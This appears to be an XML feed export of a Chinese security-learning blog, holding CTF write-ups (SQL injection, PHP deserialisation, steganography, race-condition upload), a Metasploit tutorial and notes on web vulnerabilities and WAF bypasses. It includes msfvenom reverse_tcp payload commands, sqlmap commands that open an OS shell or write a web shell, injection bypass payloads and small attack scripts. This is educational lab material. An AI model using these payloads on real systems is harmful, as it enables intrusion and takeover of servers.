&#123;&#39;x-forwarded-for&#39;:payload_data.format(i,j)&#125;</span><br><span class="line">            res &#x3D; requests.get(url,headers&#x3D;headers,timeout&#x3D;5)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            print(payload_data.format(i,j))</span><br><span class="line">            flag +&#x3D; j</span><br><span class="line">            break</span><br><span class="line">    print(&#39;data&#x3D;&#39;+str(flag))</span><br></pre></td></tr></table></figure><p>得到flag</p><p>flag{cdbf14c9551d5be5612f7bb5d2867853}</p>]]></content>
      
      
      <categories>
          
          <category> bugku靶场 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 | CTF | SQL注入脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF--Metasploit Framework渗透测试工具</title>
      <link href="/undefined/MSF--Metasploit%20Framework%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
      <url>/undefined/MSF--Metasploit%20Framework%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>目前最流行、最强大、最具扩展性的渗透测试平台软件    </p><p>2003年由HD More发布第一版，2007年用ruby语言重写，MSF默认集成在Kali Linux之中    </p><p>Kali左侧有MSF的快捷方式，可以直接点击使用，也可以在终端输入msfconsole启动MSF </p><h2 id="一-名词解释"><a href="#一-名词解释" class="headerlink" title="一.名词解释"></a>一.名词解释</h2><h3 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h3><p>漏洞利用模块，这个模块通常是用于对某些有可能存在漏洞的目标进行漏洞利用。   </p><h3 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h3><p>简单来说，Payload是黑客用来与被黑了的系统交互的简单脚本。使用payload，可以将数据传输到已经沦陷的系统。   </p><p>Metasploit有效载荷可以有三种类型-    </p><ul><li><p>Singles<br>Singles非常小，旨在建立某种通讯，然后进入下一阶段。例如，只是创建一个用户。   </p></li><li><p>Staged<br>是一种攻击者用来将更大的文件上传到沦陷的系统的payload。   </p></li><li><p>Stages<br>Stages是由Stagers模块下载的payload组件。各种payload stages提供高级功能，没有规模限制，如Meterpreter和VNCInjection。    </p></li></ul><h3 id="auxiliary"><a href="#auxiliary" class="headerlink" title="auxiliary"></a>auxiliary</h3><p>负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块     </p><h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><p>让我们举个例子来理解Metasploitpayload的使用。假设我们有一台易受DCOM MS03-026攻击的WindowsServer 2003计算机。</p><p>首先，我们将搜索可以使用此漏洞的exp。我们将使用具有最佳RANK的漏洞利用。 </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; search dcom</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/k3zDoiw.png" alt="">    </p><p>再选择要使用的exp   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;dcerpc&#x2F;ms03_026_dcom</span><br></pre></td></tr></table></figure><img src= "/img/loading.gif" data-src="https://i.imgur.com/TBnDynz.png">  <p>然后我们使用下列命令来看看我们可以使用的payload     </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(windows&#x2F;dcerpc&#x2F;ms03_026_dcom) &gt; show payloads</span><br></pre></td></tr></table></figure><img src= "/img/loading.gif" data-src="https://i.imgur.com/k3zDoiw.png">   <p>看到列出的payload可以能帮助我们上传/执行文件，使沦陷的系统成为vnc服务器（能远程监视）   </p><img src= "/img/loading.gif" data-src="https://i.imgur.com/7q6OI0e.png">  <p>为了设置我们需要的payload，选择一个payload使用下列命令      </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(windows&#x2F;dcerpc&#x2F;ms03_026_dcom) &gt; set PAYLOAD windows&#x2F;upexec&#x2F;bind_hidden_tcp</span><br></pre></td></tr></table></figure><img src= "/img/loading.gif" data-src="https://i.imgur.com/Q3bStZQ.png">   <p>设置监听主机和监听端口(LHOST,LPORT),它们是攻击者的IP和端口。然后设置远程主机和端口(RPORT,LHOST),它们是受害者IP和端口。    </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(windows&#x2F;dcerpc&#x2F;ms03_026_dcom) &gt; set LHOST 192.168.56.134</span><br><span class="line">LHOST &#x3D;&gt; 192.168.56.134</span><br><span class="line">msf5 exploit(windows&#x2F;dcerpc&#x2F;ms03_026_dcom) &gt; set LPORT 23524</span><br><span class="line">LPORT &#x3D;&gt; 23524</span><br><span class="line">msf5 exploit(windows&#x2F;dcerpc&#x2F;ms03_026_dcom) &gt; set RPORT 135</span><br><span class="line">RPORT &#x3D;&gt; 135</span><br><span class="line">msf5 exploit(windows&#x2F;dcerpc&#x2F;ms03_026_dcom) &gt; set RHOST 192.168.56.146</span><br><span class="line">RHOST &#x3D;&gt; 192.168.56.146</span><br><span class="line">msf5 exploit(windows&#x2F;dcerpc&#x2F;ms03_026_dcom) &gt;</span><br></pre></td></tr></table></figure><img src= "/img/loading.gif" data-src="https://i.imgur.com/U6NHEVX.png"><p>输入“exploit”就会创建会话    </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(windows&#x2F;dcerpc&#x2F;ms03_026_dcom) &gt; exploit</span><br></pre></td></tr></table></figure><p>这里因为我使用的windows 2003 已经有该漏洞的补丁了，所以利用失败了</p><h4 id="原文链接："><a href="#原文链接：" class="headerlink" title="原文链接："></a>原文链接：</h4><p><a href="https://www.tutorialspoint.com/metasploit/metasploit_payload.htm" target="_blank" rel="noopener">https://www.tutorialspoint.com/metasploit/metasploit_payload.htm</a></p><h3 id="2、HowPayloads-Work"><a href="#2、HowPayloads-Work" class="headerlink" title="2、HowPayloads Work"></a>2、HowPayloads Work</h3><p>payload模块位于modules/payloads/{singles,stages,stagers}/<platform>&gt;。</p><p>当框架启动时，stages与stagers结合以创建可在漏洞利用中使用的完整的payload。然后，handlers与payload配对，因此框架将知道如何使用给定的通信机制创建会话。</p><p>Payload被赋予参考名称，如下所示：</p><p>Staged payloads：<platform>/ [arch] / <stage> / <stager></p><p>Single payloads：<platform>/ [arch] / <single></p><p>这会产生像windows/ x64 / meterpreter / reverse_tcp这样的payload。平台是windows，架构是x64，我们提供的最终的stage是meterpreter，而传递它的stager是reverse_tcp。</p><p>请注意，arch是可选的，因为在某些情况下，它是不必要或者已经默认了。比如php/ meterpreter / reverse_tcp。PHP的payload不需要Arch，因为我们提供的是解释代码而不是二进制代码。</p><p>Singles</p><p>Singlepayload发射后就不管了（就像发射x级火箭一样）。它们可以与Metasploit建立沟通机制，但没有必要。你可能会需要singlepayload的场景就是目标没有接入网络，此时仍然可以通过USB密钥提供文件格式攻击。</p><p>Stagers</p><p>Stagers是一个小发射器（同样以火箭发射作比喻），旨在创建某种形式的通信，然后将执行传递到下一个阶段。使用stager解决了两个问题。首先，它允许我们最初使用较小的有效负载来加载具有更多功能的较大的payload。其次，它使通信机制与最终阶段分离成为可能，因此一个payload无需复制代码就可以与多个传输一起使用。</p><p>Stages</p><p>由于stager通过为我们分配大量内存来介意任何大小限制问题，因此stages可以任意大。它的优点之一是能够以更高级别的语言（如C语言）编写最终阶段的payload。</p><p>DeliveringStages</p><p>你希望payload连接回来的IP地址和端口被嵌入到stager中。如上所述，所有staged payload仅仅是建立通信并执行下一阶段的小推进器。当使用staged payload创建可执行文件时，实际上只是创建了stager。所以以下命令将创建功能相同的exe文件：</p><p>msfvenom-f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcp</p><p>msfvenom-f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcp</p><p>msfvenom-f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp</p><p>（请注意，它们在功能上是相同的- 但是由于其中有很多随机化，因此没有两个可执行文件是完全相同的）</p><p>无论使用stager设置的哪种传输机制（例如：tcp，http，https），Ruby端都是充当客户端。</p><p>对于shell阶段，Metasploit会在你与其进行交互时将远程进程的标准输入输出连接到你的终端。</p><p>在Meterpreter阶段的情况下，Metasploit将开始使用Meterpreterwire协议。</p><h4 id="原文："><a href="#原文：" class="headerlink" title="原文："></a>原文：</h4><p><a href="https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC | Where is file?</title>
      <link href="/undefined/%5BISCC%5DWhere%20is%20file/"/>
      <url>/undefined/%5BISCC%5DWhere%20is%20file/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> WEB漏洞 </category>
          
          <category> 文件包含 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 | PHP伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web应用安全概述</title>
      <link href="/undefined/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0/"/>
      <url>/undefined/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="OWASP-开放的web应用程序安全项目组织"><a href="#OWASP-开放的web应用程序安全项目组织" class="headerlink" title="OWASP(开放的web应用程序安全项目组织)"></a>OWASP(开放的web应用程序安全项目组织)</h3><p>OWASP TOP10（10大应用安全风险）</p><ul><li>1.注入</li><li>2.失效的身份认证和会话管理</li><li>3.XSS</li><li>4.不安全的对象直接引用</li><li>5.CSRF</li><li>6.安全的错误配置</li><li>7.限制URL访问失败</li><li>8.未验证的重定向转发</li><li>9.应用已知的漏洞组件</li><li>10.敏感信息泄露<h4 id="一-SQL-注入漏洞"><a href="#一-SQL-注入漏洞" class="headerlink" title="一.SQL 注入漏洞"></a>一.SQL 注入漏洞</h4><h5 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h5><h5 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程"></a>2.流程</h5>注入点探测   </li></ul><p>自动探测：web漏扫工具，AWS，APPSCAN，openVAS,nessus，OWASPZAP,Burpsuit   </p><p>手工方式： 手工构造payload   </p><p>信息获取   </p><p>环境信息：数据库的类型，版本，操作系统版本，用户信息</p><p>数据库的信息：库名，表名，字段名，数据值（管理员账户密码）</p><p>获取权限</p><p>获取操作系统权限，通过执行shell，上传大马或者小马</p><h5 id="3-sqlmap"><a href="#3-sqlmap" class="headerlink" title="3.sqlmap"></a>3.sqlmap</h5><p>5中注入类型：盲注，联合注入，二次注入，堆叠注入，报错注入</p><p>整型<br>$ =”select * from users where name = $name and pass = $pass”;<br>$ =”select * from users where name = or 1=1 # and pass = $pass”;<br>等价select * from users;</p><p>字符型<br>$ = “select * from users where name = ‘$name’ and pass =  “$pass””;<br>$ = “select * from users where name = ‘’ or ‘1’=’1’# and pass =  “$pass””;</p><p>搜索型<br>$ = “select * from users where password like ‘%$pwd%’  order by password”;<br>$ = “select * from users where password like ‘%’ 1=1 and ‘%’=’%’  order by password”;   </p><p>sqlmap用法   </p><p>sqlmap -u url地址/参数=值 –dbs<br>sqlmap -u url地址/参数=值 –os-shell———————//拿系统shell<br>sqlmap -u url地址/参数=值 –level 5 –risk=4————-//设置安全级别，风险级别<br>sqlmap -u url地址/参数=值 –file-read”c:\1.sh”———–//读取文件<br>sqlmap -u url地址/参数=值 –file-wirte shell.php –file-dest”C:\www\xxx” ———-//写shell<br>sqlmap -u url地址/参数=值</p><h5 id="4-建议下载安全狗-设置绕过练习"><a href="#4-建议下载安全狗-设置绕过练习" class="headerlink" title="4.建议下载安全狗,设置绕过练习"></a>4.建议下载安全狗,设置绕过练习</h5><p>tyamper脚本 python 基础编程，协议分析，数据库语法及编程,SQL注入漏洞原理</p><h4 id="二-XSS漏洞"><a href="#二-XSS漏洞" class="headerlink" title="二.XSS漏洞"></a>二.XSS漏洞</h4><h4 id="三-上传漏洞"><a href="#三-上传漏洞" class="headerlink" title="三.上传漏洞"></a>三.上传漏洞</h4><p>上传绕过：   </p><h5 id="1-客户端：js检查"><a href="#1-客户端：js检查" class="headerlink" title="1.客户端：js检查"></a>1.客户端：js检查</h5><h5 id="2-服务端："><a href="#2-服务端：" class="headerlink" title="2.服务端："></a>2.服务端：</h5><p>检查后缀：   </p><ul><li>黑名单：可解析的后缀.php .xxx丶上传伪静态文件（.htaccess）丶点绕过，空格绕过丶;;$DATA绕过 </li><li>白名单：%00截断丶0x00截断丶MIME绕过</li></ul><p>检查内容：文件头丶突破getimagesize()丶二次渲染<br>代码逻辑：条件竞争</p><h4 id="四-CSRF"><a href="#四-CSRF" class="headerlink" title="四.CSRF"></a>四.CSRF</h4><h4 id="五-SSRF"><a href="#五-SSRF" class="headerlink" title="五.SSRF"></a>五.SSRF</h4><p>服务端请求伪造</p><h4 id="六-暴力破解漏洞"><a href="#六-暴力破解漏洞" class="headerlink" title="六.暴力破解漏洞"></a>六.暴力破解漏洞</h4><p>账户密码 静态验证码<br>Hydra–九头蛇(ftp.ssh.telnet.mysql等)<br>Burpsuit 测试器 4种</p><h4 id="七-命令执行漏洞"><a href="#七-命令执行漏洞" class="headerlink" title="七.命令执行漏洞"></a>七.命令执行漏洞</h4><p>程序调用系统的函数，php，哪些函数会调用：<br>system()<br>exec:<br>shell_exec:<br>等<br>1.远程命令执行漏洞<br>eval()<br>assert()<br>preg_repalce()<br>2.本地命令执行漏洞<br>system()<br>exec()<br>shell_exec()   </p><h4 id="八-包含漏洞"><a href="#八-包含漏洞" class="headerlink" title="八.包含漏洞"></a>八.包含漏洞</h4><p>include()<br>include_once()<br>require()<br>require_once()   </p><h4 id="九-XXE漏洞"><a href="#九-XXE漏洞" class="headerlink" title="九.XXE漏洞"></a>九.XXE漏洞</h4><p>XML基础知识<br>危害：<br>读取任意文件<br>执行系统指令<br>探测内网端口<br>攻击内网网站</p><h4 id="十-反序列化漏洞"><a href="#十-反序列化漏洞" class="headerlink" title="十.反序列化漏洞"></a>十.反序列化漏洞</h4>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC | 是我DIO哒</title>
      <link href="/undefined/%5BISCC%5D%E6%98%AF%E6%88%91DIO%E5%93%92/"/>
      <url>/undefined/%5BISCC%5D%E6%98%AF%E6%88%91DIO%E5%93%92/</url>
      
        <content type="html"><![CDATA[<p><img src= "/img/loading.gif" data-src="https://i.imgur.com/pcz4stw.png" alt="">   </p><p>首先下载得到图片   </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/noZWCEy.png" alt=""></p><p>很骚气   </p><p>首先常规操作查看属性详细信息，改成txt后缀啥的，用Stegsolve都没有啥发现。然后还是二话不说binwalk上手。   </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/DxYT4wO.png" alt="">    </p><p>通过扫描二维码得到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Useful_Massage_1(SVNDQyU3QmZsQGdfaXN)</span><br></pre></td></tr></table></figure><p>en<del>en</del>en~<br>我这个英语废物也知道这个message拼错了。。。。<br>然后尝试去base64解码了一下    </p><p>得到一部分flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ISCC&#123;fl@g_is</span><br></pre></td></tr></table></figure><p>然后再找另一部分，就从分离出来的另一张图片着手    </p><p>再用stegSolve摩擦了一遍Dio。这里因为感觉图片的名字有点问题，所以尝试使用Data Extract功能   </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/HvGIMz3.png" alt=""></p><p>左边一大部分主要是讲了RGBA（Alpha是透明度）的颜色通道</p><p>为了方便理解我们分开说</p><p>RGB是红绿蓝 但他们的值代表的实际上是亮度</p><p>R的数字越大，则代表红色亮度越高；R的数字越小，则代表红色亮度越低。G，B同理</p><p>R的亮度各有256个级别，GB同理。即从0到255，合计为256个。从数字0到255的逐渐增高，我们人眼观察到的就是亮度越来越大，红色、绿色或蓝色越来越亮。然而256是2的8次方 所以你会看见上图的7~0  一共8个通道</p><p>而Alpha就是透明度 该通道用256级灰度来记录图像中的透明度信息，定义透明、不透明和半透明区域</p><p>alpha的值为0就是全透明，alpha 的值为 255 则表示不透明</p><p>因此左半部分就理解了</p><p>右半部分就是Extra By(额外的)和Bit Order（位顺序）和Bit Plane Order（位平面的顺序）</p><p>1）.Extra By(额外的)：分为row（行）和column（纵）</p><p>   每个像素用R，G，B三个分量表示，那么一张图片就像一个矩阵，矩阵的每个单位就是（0<del>255，0</del>255，0~255）</p><p>   也就会有是纵排列和行排列了，一般事先访问行再访问列（如果相反会引起ve使用方法）</p><p>￼2）.Bit Order（位顺序）:MSB是一串数据的最高位，LSB是一串数据的最低位。   </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/Upln9YJ.png" alt="">   </p><p>尝试了几次就成功得到第二个信息   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Useful_M assage_2(fa09fTjBfRCUyMW9fZGFhYWElMjFfXyU3RA&#x3D;&#x3D;)</span><br></pre></td></tr></table></figure><p>然后这里其实是将两个message拼接然后base64解码得到flag   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ISCC&#123;fl@g_is_kO_N0_D!o_daaaa!__&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 杂项 </category>
          
          <category> PNG图片隐写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> png图片隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入绕过</title>
      <link href="/undefined/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"/>
      <url>/undefined/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="1-WAF相关介绍"><a href="#1-WAF相关介绍" class="headerlink" title="1.WAF相关介绍"></a>1.WAF相关介绍</h2><p>WAF(web应用防火墙)   </p><h3 id="WAF有哪些类："><a href="#WAF有哪些类：" class="headerlink" title="WAF有哪些类："></a>WAF有哪些类：</h3><ul><li>1.软件型WAF</li><li>2.硬件型WAF</li><li>3.云WAF<br>反向代理模式工作，通过配置NS记录或者CNAME记录     </li><li>网站系统内置的WAF<br>waf的功能：<br>1.审计<br>2.访问控制/过滤<br>3.web加固<br>WAF怎么识别扫描器<br>1.AWVS,SQLMAP,APPscan,OpenVAS等工具<br>以下几个点来识别waf   <pre><code>1.扫描器指纹（head字段/请求的参数值）      2.单IP+cookie某一个时间段出发多少次来判断       3.隐藏链接标签     ...   </code></pre></li></ul><p>对于注入过程当中如何去判断目标是否有WAF<br>1.sqlmap -u url地址 –identity-waf –batch<br>2.手工判断<br>xxx.com/?user=a’ union select 1,2,3 –+<br>放入一个不存在的参数去触发waf防护；触发形式：页面无法访问，响应码异常，返回提示</p><h2 id="2-SQL注入绕过"><a href="#2-SQL注入绕过" class="headerlink" title="2.SQL注入绕过"></a>2.SQL注入绕过</h2><ul><li>黑名单过滤：空格，/，,‘,and,or,union,select,sleep(),”,#,-,+,limit等   </li><li>一：双写绕过</li><li>二：大小写绕过</li><li>三：编码绕过    </li></ul><p>1.base64<br>2.ASCII<br>3.宽字符<br>4.url编码<br>5.Unicode编码<br>…….</p><ul><li>四：替换关键字<br>id=1 UNIunionON SEselectLECT 1,2,3    </li><li>五：注释绕过<br>空格通过注释来代替   /**/<br>空格通过()来代替     </li></ul>]]></content>
      
      
      <categories>
          
          <category> WEB安全漏洞 </category>
          
          <category> SQL注入漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC | Php is the best language</title>
      <link href="/undefined/%5BISCC%5DPhp%20is%20the%20best%20language/"/>
      <url>/undefined/%5BISCC%5DPhp%20is%20the%20best%20language/</url>
      
        <content type="html"><![CDATA[<p>首先拿到题目下载文件得到源码：<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/LwHKfwo.png" alt=""></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">@error_reporting(1);</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">class baby </span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            $filename &#x3D; &quot;.&#x2F;&#123;$this-&gt;file&#125;&quot;;</span><br><span class="line">            if (base64_encode(file_get_contents($filename)))</span><br><span class="line">            &#123;</span><br><span class="line">                return base64_encode(file_get_contents($filename));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#39;data&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $data &#x3D; $_GET[&#39;data&#39;];</span><br><span class="line">        $good &#x3D; unserialize($data);</span><br><span class="line">        echo $good;</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">    $url&#x3D;&#39;.&#x2F;index.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$html&#x3D;&#39;&#39;;</span><br><span class="line">if(isset($_POST[&#39;test&#39;]))&#123;</span><br><span class="line">    $s &#x3D; $_POST[&#39;test&#39;];</span><br><span class="line">    $html.&#x3D;&quot;&lt;p&gt;谢谢参与!&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>unserialize()反序列化函数，确定为反序列化题目<br>直接构造序列化函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">@error_reporting(1);</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">class baby </span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            $filename &#x3D; &quot;.&#x2F;&#123;$this-&gt;file&#125;&quot;;</span><br><span class="line">            if (base64_encode(file_get_contents($filename)))</span><br><span class="line">            &#123;</span><br><span class="line">                return base64_encode(file_get_contents($filename));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#39;data&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $data &#x3D; $_GET[&#39;data&#39;];</span><br><span class="line">        $good &#x3D; unserialize($data);</span><br><span class="line">        echo $good;</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">    $url&#x3D;&#39;.&#x2F;index.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;创建一个对象，进行file属性赋值，然后序列化对象。</span><br><span class="line">$a &#x3D; new baby();</span><br><span class="line">$a-&gt;file &#x3D; &quot;flag.php&quot;;</span><br><span class="line">echo (serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行得到序列化字符   </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/AeHsSbo.png" alt=""></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;baby&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>再将得到的序列化字符串通过get(‘data’)传入例题。通过反序列化输出flag.php的文件信息   </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/rwPwaDi.png" alt=""></p><p>base64解码得到flag   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;u_r_really_a_php_expert&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB安全漏洞 </category>
          
          <category> 反序列化漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>条件竞争漏洞</title>
      <link href="/undefined/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/"/>
      <url>/undefined/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是条件竞争漏洞"><a href="#什么是条件竞争漏洞" class="headerlink" title="什么是条件竞争漏洞"></a>什么是条件竞争漏洞</h3><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>假设有这么一个代码，实现用户上传图片功能</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  if(isset($_GET[&#39;src&#39;]))&#123;</span><br><span class="line">    copy($_GET[&#39;src&#39;],$_GET[&#39;dst&#39;]);</span><br><span class="line">    &#x2F;&#x2F;...</span><br><span class="line">    &#x2F;&#x2F;check file</span><br><span class="line">    unlink($_GET[&#39;dst&#39;]);</span><br><span class="line">    &#x2F;&#x2F;...</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>该代码中通过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy($_GET[&#39;src&#39;],$_GET[&#39;dst&#39;])</span><br></pre></td></tr></table></figure><p>将上传的文件从源地址转换到目的地址进行储存。    </p><p>然后通过中间一系列 check file 代码，检查文件的安全性，如果发现该文件为不安全文件则使用 unlink 删除该文件。 但是如果判断时间过长，在该不安全文件被判定性质并且删除之前执行了该文件则会导致系统漏洞的形成。</p><h3 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h3><p>攻击者上传了一个用来生成恶意 shell 的文件，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意 shell 的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个 shell 文件，后续的一切就都不是问题了。</p><h3 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h3><p>调整没有字典的爆破，不断发包<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/PUIHvpe.png" alt="">   </p><p>然后设置发送三千个数据包，然后设置线程调至50<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/5jNUoV8.png" alt="">   </p><p>第一个包为以50线程迅速上传三千次，<br>第二个包为以50线程迅速访问三千次，只要速度够快就可以访问到。<br>然后开始爆破成功得到flag，我们可以看到也不是百分百可以得到flag，存在竞争.<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/iFtWUUx.png" alt="">   </p><p>也可以使用burpsuit发包+条件竞争脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;202.119.201.199&#x2F;challenge&#x2F;web&#x2F;uploadfile&#x2F;upload&#x2F;index.phtml&#39;</span><br><span class="line"></span><br><span class="line">req &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">ans &#x3D; req.get(url)</span><br><span class="line">web_content &#x3D; ans.content</span><br><span class="line"></span><br><span class="line">if &#39;flag&#39; in web_content:</span><br><span class="line">print web_content</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB安全漏洞 </category>
          
          <category> 条件竞争漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 条件竞争漏洞 | CTF | 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP函数笔记</title>
      <link href="/undefined/PHP%E5%87%BD%E6%95%B0%E7%AC%94%E8%AE%B0/"/>
      <url>/undefined/PHP%E5%87%BD%E6%95%B0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos() 函数"></a>strpos() 函数</h3><p>查找字符串在另一个字符串中首次出现的位置</p><h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(strpos(&#39;开始23测试ceshi&#39;, &#39;测试&#39;));</span><br><span class="line">&#x2F;&#x2F;输出int(8)</span><br><span class="line">&#x2F;&#x2F;strpos 按字节处理，UTF-8一个汉字占3个字节</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="mb-strpos-函数"><a href="#mb-strpos-函数" class="headerlink" title="mb_strpos 函数"></a>mb_strpos 函数</h3><p>查找字符串在另一个字符串中首次出现的位置</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight 